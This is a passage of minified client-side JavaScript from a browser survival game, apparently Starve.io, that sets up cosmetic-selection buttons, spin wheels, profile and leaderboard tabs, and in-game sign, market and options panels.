      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 159, 395, Z | q, $);
      this.buttons[A++].view = z;
      this.buttons[A] = rs(39, 122, 0, [IMAGES.SKIN_PREVIOUS_OUT, IMAGES.SKIN_PREVIOUS_IN, IMAGES.SKIN_PREVIOUS_CLICK], 1, 0, undefined, -61, 315, Z | q, $);
      this.buttons[A++].view = z;
      this.buttons[A] = rs(39, 122, 0, [IMAGES.SKIN_NEXT_OUT, IMAGES.SKIN_NEXT_IN, IMAGES.SKIN_NEXT_CLICK], 1, 0, undefined, 260, 315, Z | q, $);
      this.buttons[A++].view = z;
      this.buttons[A] = rs(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
        F(u);
      }, -320, 470, Z | q, $);
      this.buttons[A++].view = z;
      FIRST_BUTTON_BAG = A;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, -29, 205, Z | q, $);
      this.buttons[A++].view = P;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, -29, 300, Z | q, $);
      this.buttons[A++].view = P;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, -29, 395, Z | q, $);
      this.buttons[A++].view = P;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 65, 205, Z | q, $);
      this.buttons[A++].view = P;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 65, 300, Z | q, $);
      this.buttons[A++].view = P;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 65, 395, Z | q, $);
      this.buttons[A++].view = P;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 159, 205, Z | q, $);
      this.buttons[A++].view = P;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 159, 300, Z | q, $);
      this.buttons[A++].view = P;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 159, 395, Z | q, $);
      this.buttons[A++].view = P;
      this.buttons[A] = rs(39, 122, 0, [IMAGES.SKIN_PREVIOUS_OUT, IMAGES.SKIN_PREVIOUS_IN, IMAGES.SKIN_PREVIOUS_CLICK], 1, 0, undefined, -61, 315, Z | q, $);
      this.buttons[A++].view = P;
      this.buttons[A] = rs(39, 122, 0, [IMAGES.SKIN_NEXT_OUT, IMAGES.SKIN_NEXT_IN, IMAGES.SKIN_NEXT_CLICK], 1, 0, undefined, 260, 315, Z | q, $);
      this.buttons[A++].view = P;
      this.buttons[A] = rs(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
        F(u);
      }, -320, 470, Z | q, $);
      this.buttons[A++].view = P;
      FIRST_BUTTON_BOOK = A;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, -29, 205, Z | q, $);
      this.buttons[A++].view = y;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, -29, 300, Z | q, $);
      this.buttons[A++].view = y;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, -29, 395, Z | q, $);
      this.buttons[A++].view = y;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 65, 205, Z | q, $);
      this.buttons[A++].view = y;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 65, 300, Z | q, $);
      this.buttons[A++].view = y;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 65, 395, Z | q, $);
      this.buttons[A++].view = y;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 159, 205, Z | q, $);
      this.buttons[A++].view = y;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 159, 300, Z | q, $);
      this.buttons[A++].view = y;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 159, 395, Z | q, $);
      this.buttons[A++].view = y;
      this.buttons[A] = rs(39, 122, 0, [IMAGES.SKIN_PREVIOUS_OUT, IMAGES.SKIN_PREVIOUS_IN, IMAGES.SKIN_PREVIOUS_CLICK], 1, 0, undefined, -61, 315, Z | q, $);
      this.buttons[A++].view = y;
      this.buttons[A] = rs(39, 122, 0, [IMAGES.SKIN_NEXT_OUT, IMAGES.SKIN_NEXT_IN, IMAGES.SKIN_NEXT_CLICK], 1, 0, undefined, 260, 315, Z | q, $);
      this.buttons[A++].view = y;
      this.buttons[A] = rs(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
        F(u);
      }, -320, 470, Z | q, $);
      this.buttons[A++].view = y;
      FIRST_BUTTON_CRATE = A;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, -29, 205, Z | q, $);
      this.buttons[A++].view = H;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, -29, 300, Z | q, $);
      this.buttons[A++].view = H;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, -29, 395, Z | q, $);
      this.buttons[A++].view = H;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 65, 205, Z | q, $);
      this.buttons[A++].view = H;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 65, 300, Z | q, $);
      this.buttons[A++].view = H;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 65, 395, Z | q, $);
      this.buttons[A++].view = H;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 159, 205, Z | q, $);
      this.buttons[A++].view = H;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 159, 300, Z | q, $);
      this.buttons[A++].view = H;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 159, 395, Z | q, $);
      this.buttons[A++].view = H;
      this.buttons[A] = rs(39, 122, 0, [IMAGES.SKIN_PREVIOUS_OUT, IMAGES.SKIN_PREVIOUS_IN, IMAGES.SKIN_PREVIOUS_CLICK], 1, 0, undefined, -61, 315, Z | q, $);
      this.buttons[A++].view = H;
      this.buttons[A] = rs(39, 122, 0, [IMAGES.SKIN_NEXT_OUT, IMAGES.SKIN_NEXT_IN, IMAGES.SKIN_NEXT_CLICK], 1, 0, undefined, 260, 315, Z | q, $);
      this.buttons[A++].view = H;
      this.buttons[A] = rs(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
        F(u);
      }, -320, 470, Z | q, $);
      this.buttons[A++].view = H;
      this.buttons[A] = rs(260, 260, 0, [IMAGES.SPIN_BUTTON_1_OUT, IMAGES.SPIN_BUTTON_1_IN, IMAGES.SPIN_BUTTON_1_CLICK], 1, 0, function () {
        if (t.isUserLogged()) {
          P_(3, 50);
        } else {
          F(I);
        }
      }, -65, 197, Z | q, $);
      this.buttons[A++].view = M;
      this.buttons[A] = rs(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
        F(l);
      }, 309, 180, Z | q, $);
      this.buttons[A++].view = M;
      this.buttons[A] = rs(260, 260, 0, [IMAGES.SPIN_BUTTON_2_OUT, IMAGES.SPIN_BUTTON_2_IN, IMAGES.SPIN_BUTTON_2_CLICK], 1, 0, function () {
        if (t.isUserLogged()) {
          P_(0, 100);
        } else {
          F(I);
        }
      }, -65, 197, Z | q, $);
      this.buttons[A++].view = N;
      this.buttons[A] = rs(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
        F(l);
      }, 309, 180, Z | q, $);
      this.buttons[A++].view = N;
      this.buttons[A] = rs(260, 260, 0, [IMAGES.SPIN_BUTTON_3_OUT, IMAGES.SPIN_BUTTON_3_IN, IMAGES.SPIN_BUTTON_3_CLICK], 1, 0, function () {
        if (t.isUserLogged()) {
          P_(4, 150);
        } else {
          F(I);
        }
      }, -65, 197, Z | q, $);
      this.buttons[A++].view = b;
      this.buttons[A] = rs(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
        F(l);
      }, 309, 180, Z | q, $);
      this.buttons[A++].view = b;
      this.buttons[A] = rs(260, 260, 0, [IMAGES.SPIN_BUTTON_4_OUT, IMAGES.SPIN_BUTTON_4_IN, IMAGES.SPIN_BUTTON_4_CLICK], 1, 0, function () {
        if (t.isUserLogged()) {
          P_(1, 300);
        } else {
          F(I);
        }
      }, -65, 197, Z | q, $);
      this.buttons[A++].view = L;
      this.buttons[A] = rs(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
        F(l);
      }, 309, 180, Z | q, $);
      this.buttons[A++].view = L;
      this.buttons[A] = rs(260, 260, 0, [IMAGES.SPIN_BUTTON_5_OUT, IMAGES.SPIN_BUTTON_5_IN, IMAGES.SPIN_BUTTON_5_CLICK], 1, 0, function () {
        if (t.isUserLogged()) {
          P_(2, 600);
        } else {
          F(I);
        }
      }, -65, 197, Z | q, $);
      this.buttons[A++].view = D;
      this.buttons[A] = rs(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
        F(l);
      }, 309, 180, Z | q, $);
      this.buttons[A++].view = D;
      this.buttons[A] = rs(260, 260, 0, [IMAGES.SPIN_BUTTON_4_OUT, IMAGES.SPIN_BUTTON_4_IN, IMAGES.SPIN_BUTTON_4_CLICK], 1, 0, function () {
        if (t.isUserLogged()) {
          P_(5, 300);
        } else {
          F(I);
        }
      }, -65, 197, Z | q, $);
      this.buttons[A++].view = G;
      this.buttons[A] = rs(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
        F(l);
      }, 309, 180, Z | q, $);
      this.buttons[A++].view = G;
      var ue = A;
      this.buttons[A] = rs(205, 67, 0, [IMAGES.SEASON1_PROFILE_OUT, IMAGES.SEASON1_PROFILE_IN, IMAGES.SEASON1_PROFILE_CLICK], 1, 0, function () {
        he(undefined, 0);
      }, -305, 125, Z | q, $);
      this.buttons[A++].view = h;
      var le = A;
      this.buttons[A] = rs(205, 67, 0, [IMAGES.SEASON2_PROFILE_OUT, IMAGES.SEASON2_PROFILE_IN, IMAGES.SEASON2_PROFILE_CLICK], 1, 0, function () {
        he(undefined, 1);
      }, -305, 170, Z | q, $);
      this.buttons[A++].view = h;
      var Oe = A;
      this.buttons[A] = rs(205, 67, 0, [IMAGES.SEASON3_PROFILE_OUT, IMAGES.SEASON3_PROFILE_IN, IMAGES.SEASON3_PROFILE_CLICK], 1, 0, function () {
        he(undefined, 2);
      }, -305, 215, Z | q, $);
      this.buttons[A++].view = h;
      var ce = A;
      this.buttons[A] = rs(205, 67, 0, [IMAGES.SEASON4_PROFILE_OUT, IMAGES.SEASON4_PROFILE_IN, IMAGES.SEASON4_PROFILE_CLICK], 1, 0, function () {
        he(undefined, 3);
      }, -305, 260, Z | q, $);
      this.buttons[A++].view = h;
      var Re = A;
      this.buttons[A] = rs(205, 67, 0, [IMAGES.SEASON5_PROFILE_OUT, IMAGES.SEASON5_PROFILE_IN, IMAGES.SEASON5_PROFILE_CLICK], 1, 0, function () {
        he(undefined, 3);
      }, -305, 305, Z | q, $);
      this.buttons[A++].view = h;
      var ge = A;
      this.buttons[A] = rs(460, 73, 0, [IMAGES.TOTAL_PROFILE_OUT, IMAGES.TOTAL_PROFILE_IN, IMAGES.TOTAL_PROFILE_CLICK], 1, 0, function () {
        he(-1);
      }, -180, 170, Z | q, $);
      this.buttons[A++].view = h;
      var Ce = A;
      this.buttons[A] = rs(222, 68, 0, [IMAGES.NORMAL_PROFILE_OUT, IMAGES.NORMAL_PROFILE_IN, IMAGES.NORMAL_PROFILE_CLICK], 1, 0, function () {
        he(ds.MODE_PVP);
      }, -180, 215, Z | q, $);
      this.buttons[A++].view = h;
      var Ne = A;
      this.buttons[A] = rs(222, 68, 0, [IMAGES.FOREST_PROFILE_OUT, IMAGES.FOREST_PROFILE_IN, IMAGES.FOREST_PROFILE_CLICK], 1, 0, function () {
        he(ds.MODE_LEGACY);
      }, -180, 260, Z | q, $);
      this.buttons[A++].view = h;
      var be = A;
      this.buttons[A] = rs(222, 68, 0, [IMAGES.ZOMBIE_PROFILE_OUT, IMAGES.ZOMBIE_PROFILE_IN, IMAGES.ZOMBIE_PROFILE_CLICK], 1, 0, function () {
        he(ds.MODE_ZOMBIES);
      }, -60, 215, Z | q, $);
      this.buttons[A++].view = h;
      var De = A;
      this.buttons[A] = rs(222, 68, 0, [IMAGES.VAMPIRE_PROFILE_OUT, IMAGES.VAMPIRE_PROFILE_IN, IMAGES.VAMPIRE_PROFILE_CLICK], 1, 0, function () {
        he(ds.MODE_VAMPIRES);
      }, -60, 260, Z | q, $);
      this.buttons[A++].view = h;
      this.LEADERBOARD_TOTAL = A;
      this.buttons[A] = rs(143, 66, 0, [IMAGES.TOTAL_LEAD_OUT, IMAGES.TOTAL_LEAD_IN, IMAGES.TOTAL_LEAD_CLICK], 1, 0, function () {
        W_(undefined, n_.LEADERBOARD_TOTAL);
      }, -298, 110, Z | q, $);
      this.buttons[A++].view = c;
      this.LEADERBOARD_NORMAL = A;
      this.buttons[A] = rs(104, 66, 0, [IMAGES.NORMAL_LEAD_OUT, IMAGES.NORMAL_LEAD_IN, IMAGES.NORMAL_LEAD_CLICK], 1, 0, function () {
        W_(undefined, n_.LEADERBOARD_NORMAL);
      }, -223, 110, Z | q, $);
      this.buttons[A++].view = c;
      this.LEADERBOARD_FOREST = A;
      this.buttons[A] = rs(110, 66, 0, [IMAGES.FOREST_LEAD_OUT, IMAGES.FOREST_LEAD_IN, IMAGES.FOREST_LEAD_CLICK], 1, 0, function () {
        W_(undefined, n_.LEADERBOARD_FOREST);
      }, -168, 110, Z | q, $);
      this.buttons[A++].view = c;
      this.LEADERBOARD_ZOMBIE = A;
      this.buttons[A] = rs(88, 66, 0, [IMAGES.ZOMBIE_LEAD_OUT, IMAGES.ZOMBIE_LEAD_IN, IMAGES.ZOMBIE_LEAD_CLICK], 1, 0, function () {
        W_(undefined, n_.LEADERBOARD_ZOMBIE);
      }, -110, 110, Z | q, $);
      this.buttons[A++].view = c;
      this.LEADERBOARD_VAMPIRE = A;
      this.buttons[A] = rs(88, 66, 0, [IMAGES.VAMPIRE_LEAD_OUT, IMAGES.VAMPIRE_LEAD_IN, IMAGES.VAMPIRE_LEAD_CLICK], 1, 0, function () {
        W_(undefined, n_.LEADERBOARD_VAMPIRE);
      }, -63, 110, Z | q, $);
      this.buttons[A++].view = c;
      this.buttons[A] = rs(86, 44, 0, [IMAGES.TERMS_BUTTON_OUT, IMAGES.TERMS_BUTTON_IN, IMAGES.TERMS_BUTTON_CLICK], 1, 0, function () {
        window.open("./terms.html", "_blank");
      }, 349, 290, Z | q, $);
      this.buttons[A++].view = l;
      var Se = new r(COSMETICS.SKIN, FIRST_BUTTON_SKIN, function (e) {
        n_.skin = e;
        if (n_.unlock.skin[e] === 1) {
          Cookies.set("starve_skin", "" + e, {
            expires: 30
          });
        }
      }, this.skin, this.unlock.skin);
      var pe = new r(COSMETICS.BAG, FIRST_BUTTON_BAG, function (e) {
        n_.bag = e;
        if (n_.unlock.bag[e] === 1) {
          Cookies.set("starve_bag", "" + e, {
            expires: 30
          });
        }
      }, this.bag, this.unlock.bag);
      var me = new r(COSMETICS.BOOK, FIRST_BUTTON_BOOK, function (e) {
        n_.book = e;
        if (n_.unlock.book[e] === 1) {
          Cookies.set("starve_book", "" + e, {
            expires: 30
          });
        }
      }, this.book, this.unlock.book);
      var ve = new r(COSMETICS.CRATE, FIRST_BUTTON_CRATE, function (e) {
        n_.dead = e;
        if (n_.unlock.dead[e] === 1) {
          Cookies.set("starve_dead", "" + e, {
            expires: 30
          });
        }
      }, this.dead, this.unlock.dead);
      var Me = new r(COSMETICS.CRATE, FIRST_BUTTON_LOOT, function (e) {
        n_.crate = e;
        if (n_.unlock.crate[e] === 1) {
          Cookies.set("starve_crate", "" + e, {
            expires: 30
          });
        }
      }, this.crate, this.unlock.crate);
      var Le = new r(COSMETICS.ACCESSORY, FIRST_BUTTON_ACCESSORY, function (e) {
        n_.accessory = e;
        if (n_.unlock.accessory[e] === 1) {
          Cookies.set("starve_accessory", "" + e, {
            expires: 30
          });
        }
      }, this.accessory, this.unlock.accessory);
      this.trigger_mousedown = function (e) {
        h_.pos = is(t.can, e);
        for (var i = 0; i < t.buttons.length; i++) {
          if (t.buttons[i].info.active === ee) {
            t.buttons[i].trigger(t.can, h_.pos, jo);
          }
        }
      };
      this.trigger_mouseup = function (e) {
        h_.pos = is(t.can, e);
        for (var i = 0; i < t.buttons.length; i++) {
          var r = t.buttons[i];
          if (r.info.active === ee && r.trigger(t.can, h_.pos, Zo)) {
            return void r.info.callback();
          }
        }
      };
      this.current_cursor = false;
      this.trigger_mousemove = function (i) {
        h_.pos = is(t.can, i);
        for (var r = false, n = 0; n < t.buttons.length; n++) {
          if (t.buttons[n].info.active === ee) {
            r |= t.buttons[n].trigger(t.can, h_.pos, qo);
          }
        }
        if (t.current_cursor !== r) {
          t.current_cursor = r;
          e.style.cursor = r ? t.cursor1 : t.cursor0;
        }
      };
      this.add_event_listener = function () {
        window.addEventListener("mousedown", this.trigger_mousedown, false);
        window.addEventListener("mouseup", this.trigger_mouseup, false);
        window.addEventListener("mousemove", this.trigger_mousemove, false);
      };
      this.remove_event_listener = function () {
        window.removeEventListener("mousedown", this.trigger_mousedown, false);
        window.removeEventListener("mouseup", this.trigger_mouseup, false);
        window.removeEventListener("mousemove", this.trigger_mousemove, false);
      };
    }
    function ys(e, i) {
      var t = this;
      this.can = e;
      this.ctx = i;
      if (window.navigator.userAgent.indexOf("Edge") > -1) {
        this.cursor0 = "default";
        this.cursor1 = "pointer";
      } else {
        this.cursor0 = "url('img/cursor0.png'), default";
        this.cursor1 = "url('img/cursor1.png'), pointer";
      }
      this.show_ui = 1;
      this.show_clock = 1;
      this.show_recipe_book = 1;
      this.show_quest = 1;
      this.team_box = {
        id: document.getElementById("team_box"),
        style: document.getElementById("team_box").style,
        update: function () {
          this.style.left = Math.floor(m - 125) + "px";
          this.style.top = "110px";
        }
      };
      this.audio = {
        button_on: rs(60, 60, 0, sprite[Ie.SOUND_BUTTON_ON]),
        button_off: rs(60, 60, 0, sprite[Ie.SOUND_BUTTON_OFF])
      };
      this.sign = {
        open: false,
        breads: 0,
        symbol: document.getElementById("sign_object"),
        symbol_id: 0,
        id: document.getElementById("sign_window"),
        style: document.getElementById("sign_window").style,
        button: rs(60, 60, 0, sprite[Ie.SIGN_BUTTON]),
        update_button: function () {
          var e = Math.floor(Math.floor((3 + __.craft.can_craft.length) / 4) * (10 + sprite[Ie.INV_WOOD][0].width) + 35);
          this.button.info.translate.x = e;
          this.button.info.translate.y = 22;
        },
        update: function () {
          this.style.left = Math.floor(m - 150) + "px";
          this.style.top = Math.floor(v - 115) + "px";
        },
        quit: function () {
          T_.sign.style.display = "none";
          T_.sign.open = false;
        },
        select: function () {
          T_.sign.open = !T_.sign.open;
          if (T_.sign.open) {
            T_.sign.style.display = "inline-block";
          } else {
            T_.sign.style.display = "none";
          }
        },
        ok: function () {
          client.update_sign(__.sign.iid, T_.sign.symbol_id);
          T_.sign.select();
        },
        up: function () {
          T_.sign.symbol_id = T_.sign.symbol_id === 0 ? As.SYMBOL_MAX - 1 : T_.sign.symbol_id - 1;
          T_.sign.symbol.src = "./img/sign" + T_.sign.symbol_id + ".png";
        },
        down: function () {
          T_.sign.symbol_id = (T_.sign.symbol_id + 1) % As.SYMBOL_MAX;
          T_.sign.symbol.src = "./img/sign" + T_.sign.symbol_id + ".png";
        }
      };
      document.getElementById("quit_sign").addEventListener("mouseup", this.sign.select, false);
      document.getElementById("ok_sign").addEventListener("mouseup", this.sign.ok, false);
      document.getElementById("sign_up").addEventListener("mouseup", this.sign.up, false);
      document.getElementById("sign_down").addEventListener("mouseup", this.sign.down, false);
      this.market = {
        open: false,
        id: document.getElementById("shop_market"),
        style: document.getElementById("shop_market").style,
        items: [{
          id: 0,
          name: "wood",
          val: 1,
          b: 1,
          a: 3,
          img_item: Ie.INV_WOOD
        }, {
          id: 1,
          name: "stone",
          val: 1,
          b: 1,
          a: 4,
          img_item: Ie.INV_STONE
        }, {
          id: 2,
          name: "gold",
          val: 1,
          b: 1,
          a: 6,
          img_item: Ie.INV_GOLD
        }, {
          id: 3,
          name: "diamond",
          val: 4,
          b: 4,
          a: 1,
          img_item: Ie.INV_DIAMOND
        }, {
          id: 4,
          name: "amethyst",
          val: 8,
          b: 8,
          a: 1,
          img_item: Ie.INV_AMETHYST
        }, {
          id: 5,
          name: "reidite",
          val: 16,
          b: 16,
          a: 1,
          img_item: Ie.INV_REIDITE
        }, {
          id: 6,
          name: "pumpkin_seed",
          val: 10,
          b: 10,
          a: 1,
          img_item: Ie.INV_PUMPKIN_SEED
        }, {
          id: 7,
          name: "carrot_seed",
          val: 16,
          b: 16,
          a: 1,
          img_item: Ie.INV_CARROT_SEED
        }, {
          id: 8,
          name: "tomato_seed",
          val: 20,
          b: 20,
          a: 1,
          img_item: Ie.INV_TOMATO_SEED
        }, {
          id: 9,
          name: "thornbush_seed",
          val: 30,
          b: 30,
          a: 1,
          img_item: Ie.INV_THORNBUSH_SEED
        }, {
          id: 10,
          name: "garlic_seed",
          val: 40,
          b: 40,
          a: 1,
          img_item: Ie.INV_GARLIC_SEED
        }, {
          id: 11,
          name: "watermelon_seed",
          val: 60,
          b: 60,
          a: 1,
          img_item: Ie.INV_WATERMELON_SEED
        }],
        button: rs(60, 60, 0, sprite[Ie.MARKET_BUTTON]),
        update: function () {
          this.style.left = Math.floor(m - 450) + "px";
          this.style.top = Math.floor(v - 270) + "px";
        },
        select: function () {
          T_.market.open = !T_.market.open;
          if (T_.market.open) {
            T_.market.style.display = "inline-block";
          } else {
            T_.market.style.display = "none";
          }
        },
        quit: function () {
          T_.market.style.display = "none";
          T_.market.open = false;
        },
        buy: function () {
          client.buy_market(this.itemMarket);
        },
        change: function () {
          this.id;
          if (this.itemMarket.a === 1) {
            var e = Math.floor(Number(this.value) * this.itemMarket.b);
            this.itemMarket.val = e;
            document.getElementById(this.itemMarket.name + "_trad_number").innerHTML = e + "";
          } else {
            e = Math.floor(Number(this.value) / this.itemMarket.a);
            this.itemMarket.val = e;
            document.getElementById(this.itemMarket.name + "_trad_number").innerHTML = e + "";
          }
        }
      };
      document.getElementById("quit_market").addEventListener("mouseup", this.market.quit, false);
      for (var r = [["mouseup", this.market.buy, "buy_"], ["click", this.market.change, ""], ["change", this.market.change, ""], ["keypress", this.market.keypress, ""]], n = 0; n < this.market.items.length; n++) {
        var a = this.market.items[n];
        document.getElementById(a.name + "_market").src = sprite[a.img_item][0]._src === undefined ? sprite[a.img_item][0].src : sprite[a.img_item][0]._src;
        if (a.a === 1) {
          document.getElementById(a.name + "_trad_number").innerHTML = a.b;
          document.getElementById(a.name + "_number").value = 1;
          document.getElementById(a.name + "_number").step = 1;
          document.getElementById(a.name + "_number").min = 1;
          document.getElementById(a.name + "_number").max = Math.floor(255 / a.b);
        } else {
          document.getElementById(a.name + "_trad_number").innerHTML = 1;
          document.getElementById(a.name + "_number").value = a.a;
          document.getElementById(a.name + "_number").step = a.a;
          document.getElementById(a.name + "_number").min = a.a;
        }
        document.getElementById("buy_" + a.name + "_number").itemMarket = a;
        document.getElementById(a.name + "_number").itemMarket = a;
        for (var o = 0; o < r.length; o++) {
          document.getElementById(r[o][2] + a.name + "_number").addEventListener(r[o][0], r[o][1], false);
        }
      }
      $("[type='number']").keypress(function (e) {
        e.preventDefault();
      });
      this.options = {
        open: false,
        id: document.getElementById("option_in_game"),
        style: document.getElementById("option_in_game").style,
        agree: document.getElementById("agree_ing").style,
        cancel_agree: document.getElementById("cancel_agree_ing").style,
        quests_agree: document.getElementById("quest_agree_ing").style,
        spectator_agree: document.getElementById("spectator_agree_ing").style,
        feed_agree: document.getElementById("auto_feed_agree_ing").style,
        info_box_agree: document.getElementById("info_agree_ing").style,
        aliasing_agree: document.getElementById("pixelated_agree_ing").style,
        button: rs(60, 60, 0, sprite[Ie.OPTION_BUTTON]),
        select_options: function () {
          T_.options.open = !T_.options.open;
          if (T_.options.open) {
            T_.options.style.display = "inline-block";
          } else {
            T_.options.style.display = "none";
          }
        },
        azerty: function () {
          n_.set_azerty();
        },
        qwerty: function () {
          n_.set_qwerty();
        },
        high: function () {
          n_.high_quality();
        },
        low: function () {
          n_.low_quality();
        },
        checkbox: function () {
          T_.safe_delete.checkbox();
        },
        cancel_checkbox: function () {
          T_.safe_cancel.checkbox();
        },
        quest_checkbox: function () {
          T_.quests.checkbox();
        },
        spectator_checkbox: function () {
          __.show_spectators.invert();
        },
        feed_checkbox: function () {
          __.auto_feed.invert();
        },
        quit: function () {
          T_.options.style.display = "none";
          T_.options.open = false;
        },
        update: function () {
          this.style.left = Math.floor(m - 235) + "px";
          this.style.top = Math.floor(v - 170) + "px";
        }
      };
      document.getElementById("azerty_ing").addEventListener("mouseup", this.options.azerty, false);
      document.getElementById("qwerty_ing").addEventListener("mouseup", this.options.qwerty, false);
      document.getElementById("low_ing").addEventListener("mouseup", this.options.low, false);
      document.getElementById("high_ing").addEventListener("mouseup", this.options.high, false);
      document.getElementById("quit_opt").addEventListener("mouseup", this.options.quit, false);
      document.getElementById("case_agree_opt").addEventListener("mouseup", this.options.checkbox, false);
      document.getElementById("quest_case_agree_opt").addEventListener("mouseup", this.options.quest_checkbox, false);
      document.getElementById("cancel_case_agree_opt").addEventListener("mouseup", this.options.cancel_checkbox, false);
      document.getElementById("spectator_case_agree_opt").addEventListener("mouseup", this.options.spectator_checkbox, false);
      document.getElementById("auto_feed_case_agree_opt").addEventListener("mouseup", this.options.feed_checkbox, false);
      this.safe_cancel = {
        open: false,
        activated: Cookies.get("starve_cancel") && Cookies.get("starve_cancel") === "0" ? 0 : 1,
        id: document.getElementById("cancel_sure_delete"),
        style: document.getElementById("cancel_sure_delete").style,
